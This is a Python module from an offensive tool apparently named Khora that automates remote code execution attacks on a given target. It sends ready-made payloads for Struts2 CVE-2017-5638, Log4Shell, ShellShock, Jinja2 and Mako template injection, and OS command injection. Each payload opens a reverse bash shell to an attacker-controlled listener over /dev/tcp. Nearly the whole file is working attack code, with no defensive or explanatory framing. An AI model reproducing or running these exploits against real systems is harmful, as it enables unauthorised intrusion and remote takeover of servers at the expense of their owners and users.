"""
RCE Module - Remote Code Execution Exploitation
Struts2, Log4Shell, ShellShock, Java Deserialization, SSTI, Command Injection
"""

import requests
import time
import logging
import json

logger = logging.getLogger("Khora.RCE")

def struts2_exploit(target, lhost, lport):
    """Apache Struts2 RCE - CVE-2017-5638"""
    print(f"\n[*] Struts2 Exploitation (CVE-2017-5638)")
    
    endpoints = ['/', '/action/', '/struts/', '/s2/admin/', '/admin.action']
    
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = f"%{{(#_='multipart/form-data',#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'],#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getExcludedPackageNames().clear(),#ognlUtil.getExcludedClasses().clear(),#context.setMemberAccess(#dm)),(#a=@java.lang.Runtime@getRuntime().exec('{cmd}')))}})"
    
    headers = {'User-Agent': payload}
    
    for endpoint in endpoints:
        try:
            url = f"http://{target}{endpoint}"
            print(f"  [+] Trying: {url}")
            response = requests.post(url, headers=headers, timeout=5)
            logger.info(f"Struts2 payload sent to {url}")
            print(f"  [✓] Payload sent")
            return True
        except:
            pass
    
    logger.warning("Struts2 failed")
    return False

def log4shell_exploit(target, lhost, lport):
    """Log4Shell RCE - CVE-2021-44228"""
    print(f"\n[*] Log4Shell Exploitation (CVE-2021-44228)")
    
    payload = f"${{jndi:ldap://{lhost}:1389/Exploit}}"
    endpoints = ['/api/log', '/error', '/search', '/message']
    
    for endpoint in endpoints:
        try:
            url = f"http://{target}{endpoint}"
            print(f"  [+] Trying: {url}")
            data = {'message': payload, 'user': payload}
            response = requests.post(url, json=data, timeout=5)
            logger.info(f"Log4Shell payload sent to {url}")
            print(f"  [✓] Payload sent")
            return True
        except:
            pass
    
    logger.warning("Log4Shell failed")
    return False

def shellshock_exploit(target, lhost, lport):
    """Bash ShellShock RCE - CVE-2014-6271"""
    print(f"\n[*] ShellShock Exploitation (CVE-2014-6271)")
    
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = f"() {{ :; }}; {cmd}"
    
    headers = {
        'User-Agent': payload,
        'Referer': payload,
    }
    
    endpoints = ['/cgi-bin/test.sh', '/cgi-bin/status.sh', '/cgi-bin/admin.sh']
    
    for endpoint in endpoints:
        try:
            url = f"http://{target}{endpoint}"
            print(f"  [+] CGI Endpoint: {url}")
            response = requests.get(url, headers=headers, timeout=5)
            logger.info(f"ShellShock payload sent to {url}")
            print(f"  [✓] CGI found")
            return True
        except:
            pass
    
    logger.warning("ShellShock failed")
    return False

def java_rce_exploit(target, lhost, lport):
    """Java Deserialization RCE"""
    print(f"\n[*] Java Deserialization Attack")
    print(f"  [*] Requires ysoserial gadget chain generation")
    logger.info("Java deserialization - requires ysoserial")
    return False

def template_injection_exploit(target, lhost, lport):
    """SSTI - Server-Side Template Injection"""
    print(f"\n[*] SSTI Attack (Jinja2/Mako/Velocity)")
    
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payloads = {
        'Jinja2': f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
        'Mako': f"${{{{exec('import os;os.system(\"{cmd}\")')}}}}"
    }
    
    endpoints = ['/api/render', '/template', '/view', '/page']
    
    for endpoint in endpoints:
        for tpl_type, payload in payloads.items():
            try:
                url = f"http://{target}{endpoint}"
                print(f"  [+] {tpl_type}: {url}")
                data = {'template': payload}
                response = requests.post(url, data=data, timeout=5)
                logger.info(f"SSTI payload sent: {tpl_type}")
                return True
            except:
                pass
    
    logger.warning("SSTI failed")
    return False

def command_injection_exploit(target, lhost, lport):
    """OS Command Injection"""
    print(f"\n[*] Command Injection Attack")
    
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payloads = [cmd, f"; {cmd}", f"| {cmd}", f"|| {cmd}"]
    
    endpoints = ['/api/ping', '/api/exec', '/api/run']
    params = ['host', 'cmd', 'command']
    
    for endpoint in endpoints:
        for param in params:
            for payload in payloads[:2]:
                try:
                    url = f"http://{target}{endpoint}"
                    print(f"  [+] {endpoint}?{param}=...")
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=5)
                    logger.info(f"Command injection attempt on {endpoint}")
                    return True
                except:
                    pass
    
    logger.warning("Command injection failed")
    return False

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - RCE Module"""
    print(f"\n{'='*70}")
    print("RCE MODULE - Remote Code Execution".center(70))
    print('='*70)
    print(f"Target: {target}")
    print(f"Listener: {lhost}:{lport}\n")
    
    logger.info(f"Starting RCE module on {target}")
    
    exploits = [
        ("Struts2 (CVE-2017-5638)", struts2_exploit),
        ("Log4Shell (CVE-2021-44228)", log4shell_exploit),
        ("ShellShock (CVE-2014-6271)", shellshock_exploit),
        ("Template Injection (SSTI)", template_injection_exploit),
        ("Command Injection", command_injection_exploit),
        ("Java Deserialization", java_rce_exploit),
    ]
    
    success_count = 0
    
    for exploit_name, exploit_func in exploits:
        try:
            if exploit_func(target, lhost, lport):
                success_count += 1
        except Exception as e:
            logger.error(f"{exploit_name} failed: {e}")
    
    print(f"\n{'='*70}")
    print(f"RCE Module Complete - {success_count} tries".center(70))
    print('='*70 + "\n")
    
    logger.info(f"RCE module completed")